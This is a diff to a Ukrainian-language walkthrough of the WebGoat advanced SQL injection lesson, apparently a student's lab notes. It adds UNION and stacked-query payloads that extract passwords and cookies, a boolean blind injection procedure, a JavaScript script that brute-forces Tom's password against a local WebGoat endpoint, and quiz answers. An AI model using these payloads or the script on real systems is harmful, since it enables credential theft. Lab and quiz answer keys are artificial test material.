@@ -2,15 +2,20 @@
 
 У цьому уроці описано складніші теми SQL-ін'єкції.
 
+---
+
 **Цілі**
 
 * Поєднання методів SQL-ін'єкції
-
 * Сліпа SQL-ін'єкція
+
+---
 
 **Спеціальні символи**
 
 <img width="933" height="301" alt="Screen Shot 2026-09-06 at 16 57 29 PM" src="https://github.com/user-attachments/assets/1ffb52e7-6712-40a5-a78e-621d2ef99602" />
+
+---
 
 **Спеціальні оператори**
 
@@ -21,7 +26,6 @@
 Правила, які слід пам'ятати під час роботи з UNION:
 
 * Кількість стовпців, вибраних у кожному операторі, має бути однаковою.
-
 * Тип даних першого стовпця в першому операторі SELECT має збігатися з типом даних першого стовпця в другому (третьому, четвертому тощо) операторі SELECT. Те саме стосується всіх інших стовпців.
 
 <img width="931" height="53" alt="Screen Shot 2026-09-06 at 16 56 00 PM" src="https://github.com/user-attachments/assets/9985df8d-641d-422c-9429-f882f1fd7f0f" />
@@ -36,6 +40,8 @@
 
 Для отримання детальнішої інформації про JOIN відвідайте: https://www.w3schools.com/sql/sql_join.asp
 
+---
+
 **Спробуйте! Отримання даних з інших таблиць**
 
 Поле введення нижче використовується для отримання даних від користувача за його прізвищем.
@@ -44,6 +50,7 @@
 <img width="931" height="161" alt="Screen Shot 2026-09-06 at 17 06 52 PM" src="https://github.com/user-attachments/assets/7b42790c-f81e-420f-aca4-65a54863a136" />
 
 Шляхом експериментів ви виявили, що це поле вразливе до SQL-ін'єкцій. Тепер ви хочете використати ці знання, щоб отримати вміст іншої таблиці.
+
 Таблиця, з якої ви хочете витягти дані:
 
 <img width="933" height="109" alt="Screen Shot 2026-09-06 at 17 07 52 PM" src="https://github.com/user-attachments/assets/4dd49cf0-35ed-4307-ab4a-e4f1d889490a" />
@@ -53,6 +60,20 @@
 **6.b)** Коли ви з'ясували…​. Який пароль Дейва?
 
 Примітка: Існує кілька способів вирішення цього завдання. Один — за допомогою UNION, інший — додаванням нового оператора SQL. Можливо, ви знайдете обидва.
+
+Спосіб UNION
+
+**' UNION SELECT userid, user_name, password, cookie, NULL, NULL, NULL FROM user_system_data --**
+
+<img width="929" height="319" alt="Screen Shot 2026-09-07 at 11 36 49 AM" src="https://github.com/user-attachments/assets/28370f23-d872-4cf5-904c-d866853b8076" />
+
+Спосіб appending a new SQL statement
+
+**'; SELECT * FROM user_system_data --**
+
+<img width="931" height="301" alt="Screen Shot 2026-09-07 at 11 39 31 AM" src="https://github.com/user-attachments/assets/98aa77a1-0b06-42e0-83cd-9e0258f0f36f" />
+
+---
 
 **Сліпа SQL-ін'єкція**
 
@@ -70,7 +91,7 @@
 
 <img width="931" height="61" alt="Screen Shot 2026-09-06 at 17 12 33 PM" src="https://github.com/user-attachments/assets/d514bf4a-81a8-4baa-9dff-d17f2ad3ee2a" />
 
-Коли ми хочемо скористатися цим, ми змінюємо URL-адресу на: https://shop.example.com?article=4 ТА 1=1 Це буде переведено як:
+Коли ми хочемо скористатися цим, ми змінюємо URL-адресу на: https://shop.example.com?article=4 AND 1=1 Це буде переведено як:
 
 <img width="931" height="57" alt="Screen Shot 2026-09-06 at 17 12 57 PM" src="https://github.com/user-attachments/assets/f3980e2b-620e-470c-91e7-81267a8c48ab" />
 
@@ -84,11 +105,157 @@
 
 <img width="927" height="45" alt="Screen Shot 2026-09-06 at 17 13 07 PM" src="https://github.com/user-attachments/assets/d09c5c40-f3ed-4263-8a44-8326b31eb02b" />
 
+---
+
 Ми пояснили основні кроки, пов'язані з SQL-ін'єкцією. У цьому завданні вам потрібно буде поєднати все, що ми пояснювали на уроках SQL.
 
 Мета: Чи можете ви увійти як Том?
 
 Бажаю вам гарного проведення часу!
 
+Робимо запит в реєстраціі шоб дізнатися довжину паролю для tom, поля email та password обовязкові, але нам потрібно заповнити їх всього один раз, нас цікавить вивід повідомлення від системи на наш запит. В даному випадку у нас утворився новий запис тому ми не вгадали довжину вона не 5 символів.
+<img width="929" height="495" alt="Screen Shot 2026-09-07 at 14 55 20 PM" src="https://github.com/user-attachments/assets/b950c7c9-f46f-49bf-9045-bca0053ba50c" />
+
+Наступна спроба дізнатися чи більша довжина ніж 10 символів, запис tom з довжиною паролю більше 10 символів є в базі
+<img width="927" height="495" alt="Screen Shot 2026-09-07 at 14 56 05 PM" src="https://github.com/user-attachments/assets/6bd82b8b-e790-4c7b-9e8b-5d8d09f2f659" />
+
+Спробуємо дізнатися чи пароль більше 20 символів, запис tom з довжиною паролю більше 20 символів є в базі
+<img width="931" height="491" alt="Screen Shot 2026-09-07 at 14 56 35 PM" src="https://github.com/user-attachments/assets/b1242b9d-548e-4a9f-a539-c15db0510200" />
+
+Спробуємо дізнатися чи пароль більше 30 символів, утворився новий запис тобто наш пароль більше 20 але меньше 30
+<img width="929" height="493" alt="Screen Shot 2026-09-07 at 14 57 05 PM" src="https://github.com/user-attachments/assets/15f1dbc4-0ed6-4513-89b6-6702322332ca" />
+
+Спробуємо дізнатися чи пароль більше 25 символів, утворився новий запис тобто наш пароль більше 20 але меньше 25
+<img width="933" height="491" alt="Screen Shot 2026-09-07 at 14 57 39 PM" src="https://github.com/user-attachments/assets/1424c95f-6520-4f2a-b84e-669620133fc0" />
+
+Спробуємо дізнатися чи пароль більше 22 символів, запис tom з довжиною паролю більше 22 символів є в базі
+<img width="933" height="501" alt="Screen Shot 2026-09-07 at 14 58 06 PM" src="https://github.com/user-attachments/assets/b36e398d-a6bf-4ca0-9d32-49ba42630120" />
+
+Спробуємо дізнатися чи пароль більше 23 символів, утворився новий запис. Отже, довжина > 22 (true), > 23 (false) — значить довжина пароля = 23
+<img width="931" height="495" alt="Screen Shot 2026-09-07 at 14 58 35 PM" src="https://github.com/user-attachments/assets/3c86c697-c6db-4ac1-b620-322b6c24d7f0" />
+
+Первіряємо, наш запис tom має пароль довжиною 23 символи
+<img width="927" height="493" alt="Screen Shot 2026-09-07 at 14 59 04 PM" src="https://github.com/user-attachments/assets/161a71d9-95c0-4acc-8a1f-458e8f690bd3" />
+
+Далі використовуємо скрипт для підбору цих 23 символів. Відкриваємо консоль та додаємо наш скрипт і запускаємо
+<img width="1280" height="623" alt="Screen Shot 2026-09-07 at 15 22 49 PM" src="https://github.com/user-attachments/assets/04a52bf3-214b-428e-a891-3bce5e0399cd" />
+
+**Script**
+
+(async function() {
+  var URL = "http://127.0.0.1:8080/WebGoat/SqlInjectionAdvanced/register";
+  var LENGTH = 23;
+  var ALPHABET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=_-.!@#$%^&*() ";
+  var counter = 0;
+
+  async function isTrue(sqlCondition) {
+    counter++;
+    var payload = "tom' AND " + sqlCondition + "-- ";
+    var body = new URLSearchParams({
+      username_reg: payload,
+      email_reg: "z" + Date.now() + "_" + counter + "@mail.com",
+      password_reg: "q",
+      confirm_password_reg: "q"
+    });
+    var res = await fetch(URL, {
+      method: "PUT",
+      headers: { "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8" },
+      body: body.toString()
+    });
+    var json = await res.json();
+    return json.feedback && json.feedback.indexOf("already exists") !== -1;
+  }
+
+  var password = "";
+  for (var pos = 1; pos <= LENGTH; pos++) {
+    var foundChar = null;
+    for (var i = 0; i < ALPHABET.length; i++) {
+      var ch = ALPHABET[i];
+      if (await isTrue("SUBSTRING(password," + pos + ",1)='" + ch + "'")) {
+        foundChar = ch;
+        break;
+      }
+    }
+    password += foundChar || "?";
+    console.log("Позиція " + pos + ": " + (foundChar || "НЕ ЗНАЙДЕНО") + "   Пароль поки: " + password);
+  }
+
+  console.log("========================");
+  console.log("ПАРОЛЬ TOM: " + password);
+  console.log("Логінься: Username=Tom  Password=" + password);
+  console.log("========================");
+})();
+
+
+
 А тепер час для вікторини! Рекомендується пройти всі уроки з SQL-ін'єкцій, перш ніж проходити вікторину. Дайте правильні відповіді на всі запитання, щоб виконати завдання.
 
+1. Яка різниця між підготовленим оператором та оператором? Правильна відповідь (4)
+
+Рішення 1: Підготовлені оператори – це оператори з жорстко закодованими параметрами.
+
+Рішення 2: Підготовлені оператори не зберігаються в базі даних.
+
+Рішення 3: Оператор виконується швидше, ніж підготовлений оператор.
+
+Рішення 4: Оператор містить фактичні значення, тоді як підготовлений оператор використовує заповнювачі.
+
+<img width="891" height="179" alt="Screen Shot 2026-09-07 at 16 07 40 PM" src="https://github.com/user-attachments/assets/2a0256e3-9336-4a2d-a429-2aa5c2888519" />
+
+---
+
+2. Який з наступних символів є заповнювачем для змінних? Правильна відповідь (3)
+
+Рішення 1: *
+
+Рішення 2: =
+
+Рішення 3: ?
+
+Рішення 4: !
+
+<img width="883" height="175" alt="Screen Shot 2026-09-07 at 16 07 48 PM" src="https://github.com/user-attachments/assets/69b969cd-c026-4ce7-a0da-5d58e0d9c31e" />
+
+---
+
+3. Як підготовлені оператори можуть бути швидшими за оператори? Правильна відповідь (2)
+
+Рішення 1: Підготовлені оператори не є статичними, що дозволяє їх оптимізувати ефективніше, ніж звичайні оператори.
+
+Рішення 2: Підготовлені оператори компілюються один раз системою керування базами даних, а потім повторно використовуються з різними вхідними даними, що зменшує накладні витрати на компіляцію.
+
+Рішення 3: Оскільки підготовлені оператори зберігаються та очікують на вхідні дані, вони значно покращують продуктивність.
+
+Рішення 4: Oracle оптимізує підготовлені оператори, роблячи їх швидшими, мінімізуючи використання ресурсів бази даних.
+
+<img width="885" height="217" alt="Screen Shot 2026-09-07 at 17 03 42 PM" src="https://github.com/user-attachments/assets/0d5a0454-f78b-44b0-8a03-2c18c4c5a840" />
+
+---
+
+4. Як підготовлені оператори допомагають запобігти SQL-ін'єкції? Правильна відповідь (3)
+
+Рішення 1: Підготовлені оператори мають вбудовані механізми для розрізнення введених користувачем даних та логіки SQL, запобігаючи зловмисним маніпуляціям.
+
+Рішення 2: Підготовлені оператори використовують заповнювачі для забезпечення правил щодо дозволеного введення даних, зменшуючи ризик SQL-ін'єкції.
+
+Рішення 3: Заповнювачі запобігають безпосередньому додаванню введених користувачем даних до SQL-запиту, забезпечуючи чітке розділення між кодом та даними.
+
+Рішення 4: Підготовлені оператори обробляють усі введені користувачем дані як літеральні значення, ніколи не змішуючи їх з командами SQL.
+
+<img width="883" height="253" alt="Screen Shot 2026-09-07 at 16 57 13 PM" src="https://github.com/user-attachments/assets/2b75b407-9886-4533-9c43-adb9a0e91460" />
+
+---
+
+5. Що станеться, якщо особа зі зловмисним наміром введе наступні дані у форму реєстрації, яка використовує підготовлений оператор? Введені дані: Robert); DROP TABLE Students;-- Правильна відповідь (4)
+
+Рішення 1: Таблиця Students та всі її дані будуть видалені.
+
+Рішення 2: Введені дані видаляють усіх студентів на ім'я Robert.
+
+Рішення 3: База даних реєструє Robert, а потім видаляє таблицю.
+
+Рішення 4: База даних обробляє весь вхідний код як звичайний рядок: Robert); DROP TABLE Students;-- без виконання його як SQL.
+
+<img width="883" height="195" alt="Screen Shot 2026-09-07 at 16 12 03 PM" src="https://github.com/user-attachments/assets/1d9546ca-ef5c-4fac-a75f-2ba2349037cb" />
+
+Вітаємо. Ви успішно виконали завдання.
